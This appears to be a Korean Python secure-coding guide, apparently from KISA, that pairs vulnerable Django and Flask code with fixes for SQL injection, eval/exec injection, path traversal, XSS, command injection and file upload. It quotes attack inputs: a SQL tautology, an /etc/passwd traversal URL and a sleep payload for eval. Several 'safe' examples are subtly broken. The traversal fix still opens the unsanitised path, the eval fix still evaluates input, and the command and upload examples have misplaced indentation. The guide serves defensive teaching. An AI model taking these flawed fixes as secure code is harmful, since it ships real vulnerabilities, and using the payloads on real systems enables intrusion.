# 제 1장 파이썬 시큐어코딩 가이드 KISA
---

## 제 1절 배경

인공지능, 블록체인 등 혁신적인 기술을 기반으로 하는 기업들이 기존 비즈니스 시장을 흔들고 새로운 트렌드를 만들어가고 있다.
스마트폰은 전 국민의 일상이 되었으며, 비대면 시장의 폭발적인 성장으로 모든 정보 흐름이 IT 기반 시스템으로 모이고 있다.
정보가 모이는 곳에는 항상 보안 위협이 뒤따르며, 다양한 IT 개발 기업들 또한 이러한 위협에 노출될 수밖에 없다.

잘 만들어진 소프트웨어는 안정적인 수입과 성장을 견인하지만, 그렇지 않은 경우 기업의 생존에 위협을 줄 수 있다.
Ponemon Institute의 보고서에 따르면, 60%의 침해 사고가 패치되지 않은 알려진 취약점으로 인한 것이라고 밝혀졌다.
특히 사용자 정보를 처리하는 웹 애플리케이션 취약점으로는 침해 사고가 빈번하게 발생되고 있다.
또한 침해 사고 발생 전까지 취약점이 있다는 사실을 인지하지 못한 기업이 전체의 62%에 달한다는 분석 결과가 나왔다.

보안 사고의 위험성과 중요성을 인지한 많은 기업들이 침입 차단 시스템과 안티바이러스 제품들을 도입해 보안 수준을 강화하고 있다.
하지만 단순 제품 도입만으로는 소프트웨어에 내재된 보안 취약점을 악용하는 공격에 대응할 수 없다.
간단한 개발 실수도 대형 보안 사고로 이어질 수 있으며, 개발 프로세스 상에서 보안 취약점을 탐색하고 발견하는 작업이 늦어질수록 수정 비용이 기하급수적으로 증가한다는 연구 결과도 공개된 바 있다.

- **소프트웨어 개발보안**은 소프트웨어 개발 과정에서 **개발자의 실수와 논리적 오류**등으로 인한 **보안 취약점 및 약점들을 최소화**해, 사이버 보안 위협으로부터 **안전한 소프트웨어를 개발하기 위한 일련의 보안 활동을 의미**한다.

- 구체적으로 **소프트웨어 개발 생명주기 SDLC(Software Development Life Cycle)**의 각 단계별로 요구되는 **보안 약점을 초기 단계에서 발견 및 수정**할 수 있으며, 이를 통해 **소프트웨어 운영 중 발생 가능한 잠재적인 보안 취약점을 예방**한다.

소프트웨어 개발보안의 중요성을 이해하고 체계화한 미국의 경우, 국토안보부 DHS를 중심으로 시큐어코딩이 포함된 소프트웨어 개발 전 설계, 구현, 시험 등에 대한 보안 활동 연구를 활발히 진행하고 있다.
이는 2011년 발표된 **안전한 사이버 미래를 위한 청사진(Blueprint for a Secure Cyber Future)**에 자세히 언급되어 있다.

국내의 경우, 2009년도부터 전자정부 서비스를 중심으로 공공 영역에서의 소프트웨어 개발 보안 연구 및 정책이 본격적으로 추진되기 시작했다.
2019년 6월에는 소프트웨어 개발보안의 법적 근거를 담은 소프트웨어진흥법 개정안이 발의되었고, 2020년 12월 10일 시행됨에 따라 민간 분야까지 소프트웨어 개발보안 영역이 확대되었다.
과학기술정보통신부는 정보보호 패러다임 변화에 대응하고, 안전하고 신뢰할 수 있는 디지털 안심 국가 실현을 목표로 2011년부터 중소기업 SW 보안 약점 진단, 민간 특화 개발보안 가이드 보급, 개발보안 교육을 통해 민간 분야의 안전한 디지털 전환을 지원하고 있다.

## 제 2절 가이드의 구성

빠르게 변화하는 ICT 기술 환경에 발맞추어 민간 분야에서도 다양한 영역에 걸쳐 가이드의 필요성이 높아졌다.
이에 민간에서 가장 많이 활용되고 있는 언어를 조사했으며, 그중 선호도가 가장 높은 파이썬 언어에 대한 시큐어코딩 가이드를 제작하게 되었다.

파이썬은 **1991년에 발표된 고급 언어**로, **플랫폼에 독립적이며 인터프리터식, 객체지향적, 동적 타입(Dynamically Typing)의 대화형 언어**이다.

다양한 플랫폼을 지원하며 라이브러리와 모듈이 풍부해 여러 교육 기관, 연구 기관 및 산업계에서 활용도가 높아지고 있는 추세다.
최근에는 웹 개발 이외에도 머신러닝 업계에서 선호하는 언어로 C, Java를 제치고 1위에 오르기도 했다.

본 가이드는 파이썬 소프트웨어 개발 시 발생 가능한 보안 위험인 보안 약점에 대한 안전한 코딩 기법과 관련 코드 예제를 제공한다.

안전한 소프트웨어 특성에 따라 일부 항목은 제외되었다.
파이썬 언어 기반 **구현 단계 보안 기능, 시간 및 상태, 에러 처리, 캡슐화** 등이 포함된다.

# PART 제2장 시큐어코딩 가이드
## 제 1절 입력 데이터 검증 및 표현

- **프로그램 입력값에 대한 검증 누락 또는 부적절한 검증, 데이터의 잘못된 형식 지정, 일관되지 않은 파싱, 인터넷 사용** 등으로 인해 보안 약점이 발생할 수 있다.

- 이는 SQL 삽입, 크로스사이트 스크립트(XSS) 등의 공격을 유발할 수 있다.

### 1. SQL 삽입

**1_ 조작된 요청**

데이터베이스(DB)와 연동된 웹 응용 프로그램에서 **입력된 데이터에 대한 유효성 검증** 을 하지 않을 경우, **공격자가 입력 폼 또는 URL 입력란에 SQL 문을 삽입** 하여 DB로부터 정보를 열람하거나 조작할 수 있는 보안 약점을 말한다.
취약한 웹 응용 프로그램에서는 사용자로부터 입력된 값을 검증 없이 넘겨받아 동적 쿼리를 생성하기 때문에, 개발자가 의도하지 않은 쿼리가 실행되어 정보 유출에 악용될 수 있다.

파이썬에서는 데이터베이스 접근에 사용되는 다양한 파이썬 모듈 간의 일관성을 장려하기 위해 **DB-API를 정의**하고 있으며, 각 데이터베이스마다 별도의 **DB 모듈을 이용해 데이터베이스에 접근**한다.
파이썬에서는 **Django, SQLAlchemy, Storm 등 ORM(Object Relational Mapping)**을 사용하여 데이터베이스에 접근할 수 있다.

파이썬에서 지원하는 다양한 ORM을 이용하면 안전하게 DB를 사용할 수 있지만, 일부 복잡한 쿼리문 생성의 어려움, 성능 저하 등의 이유로 직접 원시 SQL 실행이 필요한 경우가 있다.
ORM 대신 **원시 쿼리를 사용하는 경우**, 검증되지 않은 **외부 입력값으로 인해 SQL 삽입 공격**이 발생할 수 있다.

---
안전한 코딩 기법

DB-API 사용 시 **인자화된 쿼리**를 통해 **외부 입력값을 바인딩** 하여 사용하면 SQL 삽입 공격으로부터 안전하게 보호할 수 있다.
파이썬에서 많이 사용되는 **ORM 프레임워크**로 **Django QuerySet, SQLAlchemy, Storm** 등이 있다.
ORM 프레임워크는 기본적으로 인자화된 쿼리문을 사용하므로 SQL 삽입 공격으로부터 안전하다.
ORM 프레임워크 내에서 **원시 SQL을 사용할 경우에도 외부 입력값을 인자화된 쿼리문 바인딩 변수로 사용**하면 안전한 코드를 작성할 수 있다.

---

코드 예제: **DB API 사용 예제**

다음은 MySQL, PostgreSQL의 DB API를 사용해 입력값을 받아 처리하는 안전하지 않은 코드 예시이다.
외부 입력값을 입력받아 변수 name과 content_id에 할당하고, 해당 값을 검증 없이 쿼리문의 인자 값으로 사용하는 단순 문자열 결합을 통해 쿼리를 생성하고 있다.
이 경우 content_id 값으로 'a' OR 'a' = 'a' 같은 공격 문자열을 입력하면 조건절이 변경되어 board 테이블 전체 레코드의 name 컬럼의 내용이 공격자가 전달한 name 값으로 변경된다.

**문제 예시 (안전하지 않은 코드)**

```python
from django.shortcuts import render
from django.db import connection

def update_board(request):
    dbconn = connection
    with dbconn.cursor() as curs:
        name = request.POST.get('name', '')
        content_id = request.POST.get('content_id', '')

        # 외부 입력값을 검증 없이 사용하여 동적 쿼리 생성
        sql_query = "update board set name = " + name + " where content_id = " + content_id

        curs.execute(sql_query)
        dbconn.commit()

    return render(request, '/success.html')
```

---

**안전한 코드 예시**

아래 예제는 입력받은 외부 값들을 그대로 사용하지 않고, 인자화된 쿼리를 이용하여 바인딩한 후 execute() 메소드의 두 번째 인자 값으로 전달한다.
이렇게 **바인딩하면 공격자가 쿼리를 변조하는 값을 삽입하더라도 바인딩된 매개변수의 값으로만 사용**된다.

```python
from django.shortcuts import render
from django.db import connection

def update_board(request):
    dbconn = connection
    with dbconn.cursor() as curs:
        name = request.POST.get('name', '')
        content_id = request.POST.get('content_id', '')

        sql_query = "update board set name = %s where content_id = %s"

        curs.execute(sql_query, [name, content_id])
        dbconn.commit()

    return render(request, '/success.html')
```

---

**ORM 사용 예제**

Django의 **QuerySet은 쿼리 인자화를 사용해 쿼리를 구성**하므로 SQL 삽입 공격으로부터 안전하다.
부득이하게 원시 SQL을 사용할 경우에도 외부 입력값을 인자화된 형태로 바인딩해야 한다.

**문제 예시 (안전하지 않은 코드)**

```python
from django.shortcuts import render
from app.models import Member

def member_search(request):
    name = request.POST.get('name', '')
    query = "select * from member where name = " + name
    data = Member.objects.raw(query)

    return render(request, '/member_list.html', {'member_list': data})
```

**안전한 코드 예시**

```python
from django.shortcuts import render
from app.models import Member

def member_search(request):
    name = request.POST.get('name', '')
    query = "select * from member where name = %s"
    data = Member.objects.raw(query, [name])

    return render(request, '/member_list.html', {'member_list': data})
```
--- 

### 2. 코드 삽입(Code Injection)

**_공격자_** 1_ 파이썬 코드가 삽입된 요청 전송 **_웹 서버_**
(입력값 검증 과정 없음)

**_공격자_**2_ 코드가 실행된 결과값을 응답으로 수신 **_웹 서버_**

**코드 삽입** 은 공격자가 **소프트웨어의 의도된 동작을 변경하도록 임의의 코드를 삽입**하여, 소프트웨어가 **비정상적으로 동작하도록 만드는 보안 약점**을 말한다.
코드 삽입은 **프로그래밍 언어 자체의 기능을 이용하여 이루어진다는 점에서 운영체제 명령어 삽입과는 다르다.**

프로그램에서 사용자의 입력값 안에 **코드가 포함되는 것을 허용할 경우**, 공격자는 개발자가 의도하지 않은 코드를 실행해 **권한을 탈취하거나 인증 우회, 시스템 명령어 실행** 등을 수행할 수 있다.\
파이썬에서 **코드 삽입 공격을 유발**할 수 있는 **대표적인 함수로 eval(), exec()** 등이 있다.

이 함수들의 인자를 검증하지 않는 경우, 공격자가 전달한 코드가 그대로 실행될 수 있다.

---

안전한 코딩 기법

1. **동적 코드**를 실행할 수 있는 함수를 사용하지 않는다.
2. 필요 시 **입력값에 대해 화이트리스트 기반 검증**을 수행한다.
3. 동적 코드 실행에 사용되는 입력값은 **유효한 문자만 포함되도록 필터링**한다.

---

코드 예제: **eval() 함수**

다음은 eval()을 이용하여 사용자 입력값을 실행하는 안전하지 않은 코드 예시이다.
입력값을 검증하지 않은 채 eval() 함수의 인자로 사용하고 있다.

공격자는 **악의적인 코드를 전달**하여 **원격 쉘 실행, 악성 라이브러리 로드** 등 다양한 공격을 수행할 수 있다.
예를 들어 아래와 같은 코드를 입력하면 프로그램이 20초 동안 중단될 수 있다.

compile('for x in range(1):\n import time\n time.sleep(20)', 'a', 'single')

---

**안전하지 않은 코드 예시**

```python
from django.shortcuts import render

def route(request):
    message = request.POST.get('message', '')

    # 외부 입력값을 검증 없이 eval() 함수에 전달하므로 매우 위험하다
    ret = eval(message)

    return render(request, '/success.html', {'data': ret})
```

---

**안전한 코드 예시**

```python
from django.shortcuts import render

def route(request):
    message = request.POST.get('message', '')

    # 영문과 숫자만 허용
    if message.isalnum():
        ret = eval(message)
        return render(request, '/success.html', {'data': ret})

    return render(request, '/error.html')
```

---

**파이썬 입력 검증에 사용할 수 있는 String 메소드 예시**

**str.isalpha()**
문자열 내의 모든 문자가 알파벳이고 적어도 하나의 문자가 존재하는 경우 True를 반환한다.

**str.isdecimal()**
문자열 내의 모든 문자가 십진수 숫자이고 적어도 하나의 문자가 존재하는 경우 True를 반환한다.

**str.isdigit()**
문자열 내의 모든 문자가 숫자이고 적어도 하나의 문자가 존재하는 경우 True를 반환한다.
(십진수 문자 이외에도 첨자나 특수 숫자 포함)

---

**정규 표현식 기반 입력 검증 예시**

외부 입력값이 특정 형식이어야 하는 경우 **정규식**을 사용할 수 있다.
예: 이메일 형식 검증

```python
import re

prog = re.compile(r'([A-Za-z0-9]+[._-])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Za-z]{2,})+')
```

---

**exec() 함수 예제**

아래는 exec()를 안전하지 않게 사용하는 코드 예시이다.
외부 입력값을 검증 없이 exec() 함수의 인자로 사용하고 있다.

이 경우 **중요한 데이터 탈취, 서버 권한 획득, 서비스 거부, 심지어 시스템 전체 장악**까지 이어질 수 있다.

---

**안전하지 않은 코드 예시**

```python
from django.shortcuts import render

def request_rest_api(request):
    function_name = request.POST.get('function_name', '')

    # 입력값 검증 없이 실행하면 매우 위험하다
    exec('{}()'.format(function_name))

    return render(request, '/success.html')
```

---

**안전한 코드 예시**

```python
from django.shortcuts import render

WHITE_LIST = ['get_friends_list', 'get_address', 'get_phone_number']

def request_rest_api(request):
    function_name = request.POST.get('function_name', '')

    # 사용 가능한 함수명을 화이트리스트로 제한
    if function_name in WHITE_LIST:
        exec('{}()'.format(function_name))
        return render(request, '/success.html')

    return render(request, '/error.html', {'error': '허용되지 않은 함수입니다'})
```
 
---

### 3. 경로 조작 및 자원 삽입

**[게시판의 첨부파일 다운로드 URL 예시]**

변조 전
[http://www.victim.com/file/download/?filename=pic.jpg&path=data](http://www.victim.com/file/download/?filename=pic.jpg&path=data)

변조 후
[http://www.victim.com/file/download/?filename=passwd&path=../../../../etc/](http://www.victim.com/file/download/?filename=passwd&path=../../../../etc/)

**1_ 경로 조작 후 요청**
**2_ 시스템 파일 접근**

**검증되지 않은 외부 입력값**을 통해 **파일 및 서버 시스템 자원(파일, 소켓의 포트 등)**에 대한 접근 또는 식별을 허용할 경우, **입력값 조작으로 시스템이 보호하고 있는 자원에 임의로 접근할 수 있는 보안 약점**이다.
경로 **조작 및 자원 삽입** 약점을 이용해 공격자는 **자원 수정, 삭제, 시스템 정보 노출, 시스템 간 충돌**로 인한 서비스 장애 등을 유발할 수 있다.
또한 **경로 조작 및 자원 삽입**을 통해 공격자가 **허용되지 않은 권한을 획득하여 설정 파일을 변경하거나 실행시킬 수 있다.**

파이썬에서는 **subprocess.Popen()** 과 같이 **프로세스를 여는 함수**, **os.pipe()** 와 같이 **파이프를 여는 함수**, **socket 연결** 등에서 외부 입력값을 검증 없이 사용할 경우 경로 조작 및 자원 삽입 취약점이 발생한다.

---

안전한 코딩 기법

**외부로부터 받은 입력값을 자원(파일, 소켓의 포트 등)의 식별자로 사용**하는 경우, 반드시 적절한 검증을 거치거나 **사전에 정의된 목록(화이트리스트)**에 포함된 값만 사용해야 한다.
특히 **외부 입력이 파일명인 경우**에는 필터링을 적용하여 **Directory Traversal 공격**의 **위험이 있는 문자('/', '', '..' 등)**를 제거해야 한다.

---

코드 예제

경로 조작 공격 예제
외부 입력값으로 파일 경로를 전달받아 파일을 여는 예시이다.
만약 공격자가 ../../../etc/passwd 같은 값을 전달하면 **시스템 계정 정보가 담긴 파일의 내용이 노출**될 수 있다.

**안전하지 않은 코드 예시**

```python
import os
from django.shortcuts import render

def get_info(request):
    # 외부 입력값으로부터 파일명을 입력 받는다
    request_file = request.POST.get('request_file')

    (filename, file_ext) = os.path.splitext(request_file)
    file_ext = file_ext.lower()

    if file_ext not in ['.txt', '.csv']:
        return render(request, '/error.html', {'error': '파일을 열 수 없습니다'})

    # 입력값을 검증 없이 파일 처리에 사용했다
    with open(request_file) as f:
        data = f.read()

    return render(request, '/success.html', {'data': data})
```

---

**안전한 코드 예시**

```python
import os
from django.shortcuts import render

def get_info(request):
    request_file = request.POST.get('request_file')

    (filename, file_ext) = os.path.splitext(request_file)
    file_ext = file_ext.lower()

    if file_ext not in ['.txt', '.csv']:
        return render(request, '/error.html', {'error': '파일을 열 수 없습니다'})

    # 파일명에서 경로 조작 문자열을 제거한다
    filename = filename.replace('.', '')
    filename = filename.replace('/', '')
    filename = filename.replace('\\', '')

    try:
        with open(request_file) as f:
            data = f.read()
    except:
        return render(request, '/error.html', {'error': '파일이 존재하지 않거나 열 수 없는 파일입니다'})

    return render(request, '/success.html', {'data': data})
```

---

**자원 삽입 예제**

외부 입력값을 검증 없이 **소켓 포트 번호**로 사용하는 경우, **기존 자원과 충돌하여 서비스 장애가 발생**할 수 있다.

**안전하지 않은 코드 예시**

```python
import socket
from django.shortcuts import render

def get_info(request):
    port = int(request.POST.get('port'))

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('127.0.0.1', port))

    return render(request, '/success.html')
```

---

**안전한 코드 예시**

```python
import socket
from django.shortcuts import render

ALLOW_PORT = [4000, 6000, 9000]

def get_info(request):
    port = int(request.POST.get('port'))

    # 사용 가능한 포트 번호를 화이트리스트로 제한
    if port not in ALLOW_PORT:
        return render(request, '/error.html', {'error': '소켓 연결 실패'})

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('127.0.0.1', port))

    return render(request, '/success.html')
```

--- 

### 4. 크로스사이트 스크립트 공격 (Cross Site Scripting Attack)

**크로스사이트 스크립트 공격**은 **웹 사이트에 악성 코드를 삽입하는 공격 방법**이다.
공격자는 대상 **웹 응용프로그램의 결함**을 이용해 악성 코드를 사용자에게 전달한다.
이때 악성 코드는 일반적으로 **클라이언트 측에서 실행되는 JavaScript**를 사용한다.

XSS 공격은 **애플리케이션 서버 자체**보다 **사용자**를 주요 공격 대상으로 삼는다.
XSS는 공격자가 **웹 응용프로그램**을 속여 **브라우저에서 실행될 수 있는 형식의 데이터(코드)**를 **다른 사용자에게 전달**할 때 발생한다.

공격자는 **기본 웹 코드** 외에도 **악성 코드 다운로드**, **플러그인** 또는 **미디어 콘텐츠**를 이용할 수도 있다.
사용자가 **폼 양식에 입력한 데이터** 또는 **서버에서 클라이언트 브라우저로 전달된 데이터가 적절한 검증 없이** 화면에 표시될 경우 XSS 공격이 발생할 수 있다.

XSS 공격에는 크게 세 가지 유형이 있다.

**유형 1. Reflective XSS** (또는 **Non-persistent XSS**)

1. 공격자는 **스크립트 주입이 가능한 취약점이 존재하는 웹사이트**를 탐색한다.
2. 방문자의 **세션 쿠키를 탈취하는 악성 스크립트**를 웹사이트에 주입한다.
3. **사용자**가 **웹사이트를 방문**하면 **악성 스크립트가 실행**된다.
4. **웹사이트 방문자의 세션 쿠키**가 공격자에게 전달된다.

**Reflective XSS**는 공격 코드를 **사용자의 HTTP 요청에 삽입**한 후, **서버 응답에 그대로 반사**(reflected)시켜 브라우저에서 실행하는 공격 기법이다.
이 공격 방식은 **사용자**가 **공격자가 만든 서버로 데이터를 전송**하도록 유도해야 한다.
보통 **악성 링크를 클릭**하도록 유도하는 방식이 함께 사용된다.

공격자는 피해자가 취약한 사이트를 참조하는 URL을 방문하도록 유도한다.
피해자가 해당 링크를 클릭하면 스크립트가 피해자의 브라우저에서 자동으로 실행된다.

대부분의 경우 **Reflective XSS 공격**은 **공개 게시판**, **피싱(Phishing) 이메일**, **단축 URL** 또는 **실제와 유사한 URL**을 통해 이루어진다.

**유형 2. Persistent XSS** (또는 **Stored XSS**)

1. **공격자**는 **악성 코드를 포함한 게시글 또는 댓글을 서버에 등록**한다.
2. **사용자**가 웹서버에 접속하여 **악성 코드가 포함된 콘텐츠를 조회**한다.
3. 웹사이트는 사용자에게 악성 코드를 포함한 콘텐츠를 전달한다.
4. **사용자의 브라우저**는 이를 **정상 응답으로 인식하고 코드를 실행**한다.
5. 사용자의 민감한 정보가 공격자 서버로 전달된다.

**Persistent XSS**는 **신뢰할 수 없거나 확인되지 않은 사용자 입력이 서버에 저장**되고, 해당 데이터가 **다른 사용자에게 전달**될 때 발생한다.
이 공격은 **게시글, 댓글, 방문자 로그 기능** 등에서 발생할 수 있다.
**소셜 미디어 사이트**나 **공개 프로필 페이지**는 Persistent XSS의 대표적인 공격 대상이다.

공격자는 **프로필 입력 폼**에 악성 스크립트를 삽입해 **다른 사용자가 프로필을 방문**하면 브라우저에서 자동으로 코드가 실행되도록 할 수 있다.

**유형 3. DOM XSS** (또는 **Client Side XSS**)

**DOM XSS**는 **웹페이지에서 사용자 입력값을 처리하는 JavaScript 검증 로직을 무력화하는 공격**이다.
**악성 스크립트가 포함된 URL을 통해 전달된다는 점**에서 Reflective XSS와 유사하다.

그러나 서버의 HTTP 응답에 악성 코드가 포함되는 것이 아니라, **DOM(Document Object Model)을 조작**해 **클라이언트 단에서 공격이 실행**된다는 점에서 차이가 있다.

1. **공격자**는 **악성 코드를 포함한 조작된 URL**을 사용자에게 전달한다.
2. **사용자**가 **링크를 클릭**하면 웹서버에 요청이 전달된다.
3. 웹서버는 악성 문자열이 포함되지 않은 **정상 응답을 사용자에게 전달**한다.
4. **브라우저**는 응답 내의 **정상 스크립트를 실행**하면서 **악성 스크립트를 페이지에 삽입**한다.
5. **삽입된 악성 코드**가 **클라이언트 단에서 실행**된다.
6. **사용자의 민감한 정보**가 **공격자 서버로 전송**된다.

공격자는 **DOM XSS**를 통해 **쿠키, 세션 정보, 개인 정보**를 탈취할 수 있다.
이 정보를 이용해 **특정 웹사이트에 악성 요청**을 보내거나, **관리자 권한이 있는 계정을 탈취**할 경우 심각한 위협이 될 수 있다.
또한 피싱 공격으로 이어져 사용자의 계정 정보가 탈취될 수도 있다.

파이썬에서 많이 사용하는 **Django**와 **Flask 프레임워크**는 각각 **Django 템플릿**과 **Jinja2 템플릿**을 제공한다.
이 템플릿들은 **XSS 공격에 악용될 수 있는 HTML 문자**를 **HTML 특수문자(HTML Entity)**로 **자동 치환**하는 기능을 제공한다. 프레임워크에서 제공하는 템플릿을 올바르게 사용할 경우 XSS 위험을 줄일 수 있다.

안전한 코딩 기법
안전한 코딩 기법으로는 **입력값 또는 출력값에 스크립트가 삽입되지 않도록 문자열 치환 함수를 사용**하는 방법이 있다.
예를 들어 **&, <, >, ", ', / 등 의 문자**를 **HTML 엔티티로 변환**해야 한다.
**Python**에서는 **html.escape() 함수**를 사용해 **문자열을 안전하게 변환**할 수 있다.
**HTML 태그 사용이 필요한 게시판의 경우** **허용할 태그**만 **화이트리스트로 지정**해 처리해야 한다.

프레임워크에서 기본적으로 XSS 보호 기능을 제공하더라도, **설정 실수나 보호 기능 비활성화로 인해 취약**해질 수 있으므로 주의가 필요하다. 
**Django 프레임워크**는 XSS 방어 기능을 내장하고 있지만, **mark_safe 함수**를 잘못 사용할 경우 **보호 정책이 무력화**될 수 있다. -> **신뢰할 수 없는 데이터에 대해서는 mark_safe 함수를 사용해서는 안 된다.** 


안전하지 않은 코드 예제
```
from django.shortcuts import render
from django.utils.safestring import mark_safe

def profile_link(request):
    # 외부 입력값을 검증 없이 HTML 태그 생성에 사용
    profile_url = request.POST.get('profile_url', '')
    profile_name = request.POST.get('profile_name', '')

    object_link = '<a href="{}">{}</a>'.format(profile_url, profile_name)

    # mark_safe 함수는 Django의 XSS escape 정책을 따르지 않는다
    object_link = mark_safe(object_link)

    return render(request, 'my_profile.html', {'object_link': object_link})
```

안전한 코드
```
from django.shortcuts import render

def profile_link(request):
    profile_url = request.POST.get('profile_url', '')
    profile_name = request.POST.get('profile_name', '')

    object_link = '<a href="{}">{}</a>'.format(profile_url, profile_name)

    # 신뢰할 수 없는 데이터에 mark_safe를 적용하지 않는다
    return render(request, 'my_profile.html', {'object_link': object_link})
```




**autoescape 옵션을 off로 설정**하거나 **safe 필터를 사용**할 경우 **XSS 공격에 노출**될 수 있다. -> **신뢰할 수 없는 입력값이나 동적 데이터**에 대해서는 **autoescape 옵션을 on으로 유지**해야 한다.

안전하지 않은 코드
```
<!doctype html>
<html>
  <body>
    <div class="content">
      {% autoescape off %}
        <!-- autoescape off로 설정하면 해당 블록 내 데이터는 XSS 공격에 노출될 수 있다 -->
        {{ content }}
      {% endautoescape %}
    </div>

    <div class="content2">
      <!-- safe 필터 사용으로 XSS 공격에 노출될 수 있다 -->
      {{ content | safe }}
    </div>
  </body>
</html>

```

안전한코드
```
<!doctype html>
<html>
  <body>
    <div class="content">
      {% autoescape on %}
        <!-- autoescape on으로 설정하면 해당 블록 내 데이터는 XSS 공격에 노출되지 않는다 -->
        {{ content }}
      {% endautoescape %}
    </div>

    <div class="content2">
      <!-- 검증되지 않은 데이터에는 safe 필터를 사용하지 않는다 -->
      {{ content }}
    </div>
  </body>
</html>

```

**Flask**에서도 **사용자 입력값을 검증 없이 템플릿에 전달**할 경우 XSS 공격이 발생할 수 있다. 이 경우에도 **html.escape 함수**를 사용해 **HTML 엔티티로 변환한 뒤 출력**해야 한다.

안전하지 않은 코드
```
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/search', methods=['POST'])
def search():
    search_keyword = request.form.get('search_keyword', '')
    # 사용자 입력을 검증 또는 치환 없이 동적 웹페이지에 사용하므로 XSS 공격이 발생할 수 있다
    return render_template('search.html', search_keyword=search_keyword)
```
안전한코드
```
import html
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/search', methods=['POST'])
def search():
    search_keyword = request.form.get('search_keyword', '')
    # 동적 웹페이지 생성에 사용되는 데이터는 HTML 엔티티 코드로 치환하여 표현해야 한다
    escape_keyword = html.escape(search_keyword, quote=True)
    return render_template('search.html', search_keyword=escape_keyword)

```
---

### 5. 운영체제 명령어 삽입
1. **운영체제 명령어**가 **삽입된 요청이 전달**된다.
2. **명령어 실행 결과**가 **응답으로 반환**된다.

적절한 검증 절차를 거치지 않은 사용자 입력값이 운영체제 명령어의 일부 또는 전부로 구성되어 실행되는 경우가 있다.
이 경우 의도하지 않은 시스템 명령어가 실행되어 부적절한 권한 변경이나 시스템 동작 및 운영에 영향을 미칠 수 있다.

**명령어 라인의 파라미터나 스트림 입력** 등 **외부 입력을 사용해 시스템 명령어를 생성**하는 프로그램을 흔히 찾아볼 수 있다.
**프로그램 외부**로부터 전달받은 입력 문자열은 **기본적으로 신뢰할 수 없기 때문에 반드시 검증이 필요**하다.

운영체제 명령어 실행 시에는 **외부 입력값에 의해 멀티라인 실행**이 가능한 **특수문자(|, ;, &, :, ', ,, !)**나 **파일 리다이렉트 특수문자(>, >>) 등을 제거**해야 한다. 이를 통해 원하지 않는 운영체제 명령어 실행을 방지할 수 있다.

**명령어 라인을 구문 분석**하고 **escape 기능을 제공**하는 **shlex 모듈**을 사용해 **필터링을 수행**할 수 있다.
**subprocess 모듈**에서 **shell 옵션을 True로 설정**하면 **쉘을 통해 명령어가 실행**된다.
이 경우 **파일 이름 확장, 와일드카드, 환경 변수 확장** 등의 **쉘 기능이 검증 없이 실행**될 수 있다.
따라서 **shell 옵션은 제거**해야 하며, **기본값은 False**이다.

안전한 코드 예제

```
import subprocess
from django.shortcuts import render

def execute_command(request):
    date = request.POST.get('date', '')

# 명령어 조작에 사용될 수 있는 특수문자 제거  
    for word in ['|', '!', ':', ';', '<', '>', "'", '\\', '&']:  
        date = date.replace(word, '')  

# shell 옵션을 사용하지 않고 명령과 인자를 배열로 전달  
        subprocess.run(['cmd', '/c', 'backuplog.bat', date])  

    return render(request, 'success.html')
```

---

* 위험한 형식의 파일 업로드

1. **공격자**가 **게시판** 등에 **웹쉘 파일**을 업로드한다.
2. **게시판에 업로드된 파일 경로**를 확인한다.
3. **업로드된 경로**에 접근하여 **웹쉘을 실행**한다.

서버 측에서 **실행 가능한 스크립트 파일(asp, jsp, php, sh 등)**이 업로드 가능하고,
공격자가 웹을 통해 해당 파일을 직접 실행할 수 있는 경우 심각한 보안 취약점이 발생한다.
이 경우 **시스템 내부 명령어 실행**이나 **외부 연결을 통해 시스템 제어**가 가능해진다.

공격자가 **실행 가능한 파일**을 **서버에 업로드**하면, 파이썬에서 **문자열을 코드로 실행하는 eval 함수**나 **exec 함수**와 함께 사용될 경우 **웹쉘 공격**에 더욱 취약해질 수 있다.

안전한 코딩 기법
안전한 코딩 기법으로는 파일 업로드 시 **특정 파일 유형만 허용하는 화이트리스트 방식**을 사용해야 한다.
파일 확장자뿐 아니라 **업로드된 파일의 Content-Type도 함께 확인**해야 한다.
또한 **파일 크기**와 **파일 개수를 제한**해 **시스템 자원 고갈로 인한 서비스 거부 공격을 방지**해야 한다.
**업로드된 파일**은 **웹 루트 디렉터리 외부에 저장**해 **URL을 통한 직접 실행을 차단**해야 한다.
가능하다면 **업로드된 파일의 이름을 무작위 문자열로 변경**해 저장하는 것이 안전하다.

**파일 저장 시**에는 **최소 권한만 부여**하고, **실행 권한은 제거**해야 한다.

안전하지 않은 코드 예제

```
from django.shortcuts import render
from django.core.files.storage import FileSystemStorage

def file_upload(request):
    if request.FILES.get('upload_file'):
        upload_file = request.FILES['upload_file']
        fs = FileSystemStorage(location='media/screenshot', base_url='media/screenshot')
        filename = fs.save(upload_file.name, upload_file)
        return render(request, 'success.html', {'filename': filename})
    return render(request, 'error.html', {'error': '파일 업로드 실패'})
```
---

1_ **업로드 파일에 대해 개수, 크기, 확장자를 검사**해 업로드를 제한해야 한다. 
2_ **파일 타입 검사**는 **MIME 타입 확인**을 통해 수행해야 한다.
3_ **파일 이름의 확장자**만 검사할 경우 **변조된 확장자로 제한을 우회**할 수 있다.
따라서 **파일 시그니처**를 함께 확인하는 것이 바람직하다.

안전한 코드 예제

```
FILE_COUNT_LIMIT = 5
FILE_SIZE_LIMIT = 5242880
WHITE_LIST_EXT = ['.jpg', '.jpeg']

def file_upload(request):
    if len(request.FILES) == 0 or len(request.FILES) > FILE_COUNT_LIMIT:
        return render(request, 'error.html', {'error': '파일 개수 초과'})

    for filename, upload_file in request.FILES.items():  
        if upload_file.content_type != 'image/jpeg':  
            return render(request, 'error.html', {'error': '파일 타입 오류'})  

        if upload_file.size > FILE_SIZE_LIMIT:  
            return render(request, 'error.html', {'error': '파일 크기 오류'})  

        file_name, file_ext = os.path.splitext(upload_file.name)  
        if file_ext.lower() not in WHITE_LIST_EXT:  
            return render(request, 'error.html', {'error': '파일 확장자 오류'})  

        fs = FileSystemStorage(location='media/screenshot', base_url='media/screenshot')  
        fs.save(upload_file.name, upload_file)  

        return render(request, 'success.html')
```

* 신뢰되지 않은 URL 주소로 자동 접속 연결

1_ URL 주소가 변조된다.
2_ 타 사이트 URL로 변경된다.
3_ 사이트 접속이 발생한다.
4_ 자동 연결이 이루어진다.

사용자가 **입력한 값을 외부 사이트 주소로 사용**해 자동 접속하는 서버 프로그램은 **피싱 공격**에 노출될 가능성이 있다.
